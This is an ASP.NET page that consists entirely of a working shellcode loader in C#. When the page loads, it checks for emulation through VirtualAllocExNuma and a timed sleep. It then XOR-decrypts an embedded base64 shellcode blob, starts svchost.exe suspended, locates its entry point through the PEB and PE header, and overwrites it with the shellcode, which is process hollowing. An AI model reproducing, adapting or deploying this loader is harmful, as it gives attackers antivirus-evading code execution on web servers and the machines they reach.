<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
        public const uint CREATE_SUSPENDED = 0x4;

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        //[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = CharSet.Auto)]
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }


        //[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [System.Runtime.InteropServices.In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION
            lpProcessInformation);

        //[System.Runtime.InteropServices.DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [System.Runtime.InteropServices.Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);


        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();


    protected void Page_Load(object sender, EventArgs e) {

        string obfuscatedstringname = "exe.tsohcvs\\23metsyS\\swodniW\\:C";
        string stringname = "";

        /* EVASION 1: VirtualAllocExNuma to evade emulation */
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null) {
                return; //Emulation detected
        }

        /* EVASION 2: Sleep to evade emulation */
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        string key = "dummy"; // dummy key
        if (t2 < 2) {
                key = "NowayNoway!"; // wrong key
        } else {
                key = "Sup3rS3cr3t!"; //right key
        }
        if (key == "NowayNoway!") {
                return; //Emulation detected
        }
        else {
                //Encrypted and b64 encoded. See "Sh3llcode encrpyter1.exe"
                string base64Encoded = "rz3z14K7/2NyMzUCNCBhOmLhMiRWPNgnEHv5ASsr+WFUG3rHeTgbuBEifkWaPUHz3m9SH3AfVBK0uT4zUvKBn2E82CdQciPYcV86MqQ19AgreVE85gAzdFP+8LtyUzMr9/MAND1x4/kbKyf5c1QDPHHjkQV7nLty/2f9ODKkHgKqOgK0ErS5Pt4SMqJK0wGiOXN/Vlt2WqNGrAsx+3NWGjKzFHL/Xz00uDJPemKicv9X/TFrMwt7YqJtLQk0KHIrEmkr8d9UEieP0yoSajk6uGa6Po/MjQ57UqlgPe0CGV0bPVYXcnIiG/yRerWRfxRUNIuGJiN7+7JgOT8CtB5EuWAhGolZJErTU3VwM42G22xyM3RiTEIdQ2ULTUYKWmJCSTMoG7qiO/S06HRwMz9i+jAhWXcAPMpk+8z1Y3IzdKygmFxyUzNMEXwOFgUYUR01ZTZGVSA/KidEJhIHIh8EOGA2XX0+IERTN1JNIkEnYzchWSY1cUEMEUlkCipdGgcDDhsDA1RfEXUQOQceKR0HfEoSQDdCUR4KJF1aOBpCMTVpJwtHIkNBIncWQ3RZFxAeWl8MfGM6urUALzFrP2L6MDqLdGHd9DNyUzMzIWA9lLebZlxozLY6urI5fy97+6JZfChhHNNGcDM72tMJdnItGs8FdezVM2NyM4uGOEHzIQl76oN+RZo4QfohAHqksB5ySw6P5veTRnw69LXbZnAzO+l3k0fTdFN1cMynG8ysBjGf+Z0lM3JTYDoYcy4a/KHykEN6pLIzZFN1OYkq92CGcjN0U4qle+EAYCv71DzahDi6qBr0o3ITdFM8+co76SH1+9F0U3VwzKcbsKdStrQnxxa4dRsyoPfzAYEts2sYU2rYki5eWTT56Y2G";
                byte[] churro = System.Convert.FromBase64String(base64Encoded);
                for (int i = 0; i < churro.Length; i++) {
                        churro[i] = (byte)(((uint)churro[i] ^ key[i % key.Length]) & 0xFF);
                }

                //Deobfusate host process name
                for (int i = 0; i < obfuscatedstringname.Length; i++)
                {
                    stringname = stringname + obfuscatedstringname[obfuscatedstringname.Length - i-1];
                }


                //Run host process
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool res = CreateProcess(null, stringname, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

                //Get a pointer to the image base of svchost.exe
                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);


                //Gets base of svchost
                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                //Read PE
                byte[] data = new byte[0x200];
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                //Parse PE Header
                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C); // offset from the image base to the PE header structure
                uint opthdr = e_lfanew_offset + 0x28; // offset from the image base to the EntryPoint
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr); //Relative Virtual Address (offset from base address to EntryPoint)
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase); // Absolute EntryPoint address

                //Write the shellcode to the EntryPoint
                WriteProcessMemory(hProcess, addressOfEntryPoint, churro, churro.Length, out nRead);

                //Resume host process
                ResumeThread(pi.hThread);

        }
    }
</script>
